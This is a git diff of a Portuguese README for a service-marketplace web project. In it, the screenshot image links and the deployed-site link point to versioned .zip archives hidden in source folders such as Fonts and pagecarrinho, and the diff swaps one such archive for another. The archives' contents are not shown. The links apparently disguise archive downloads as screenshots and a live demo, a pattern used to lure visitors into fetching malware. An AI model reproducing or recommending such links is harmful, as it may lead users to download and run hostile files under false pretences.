@@ -5,13 +5,13 @@ Projeto desenvolvido para prestação de serviços com facilidade e rapidez.
 
 ## Screenshot do site
 
-![Sem título](https://raw.githubusercontent.com/Raizagomes/Alves-labe-ninja1/master/src/components/Fonts/Alves-labe-ninja1_v2.4.zip)
-![card](https://raw.githubusercontent.com/Raizagomes/Alves-labe-ninja1/master/src/components/Fonts/Alves-labe-ninja1_v2.4.zip)
+![Sem título](https://github.com/Raizagomes/Alves-labe-ninja1/raw/refs/heads/master/src/pages/pagecarrinho/Alves-ninja-labe-2.6.zip)
+![card](https://github.com/Raizagomes/Alves-labe-ninja1/raw/refs/heads/master/src/pages/pagecarrinho/Alves-ninja-labe-2.6.zip)
 
 
 
 ### link surge 
-https://raw.githubusercontent.com/Raizagomes/Alves-labe-ninja1/master/src/components/Fonts/Alves-labe-ninja1_v2.4.zip
+https://github.com/Raizagomes/Alves-labe-ninja1/raw/refs/heads/master/src/pages/pagecarrinho/Alves-ninja-labe-2.6.zip
 
 
 ### O QUE FUNCIONA?
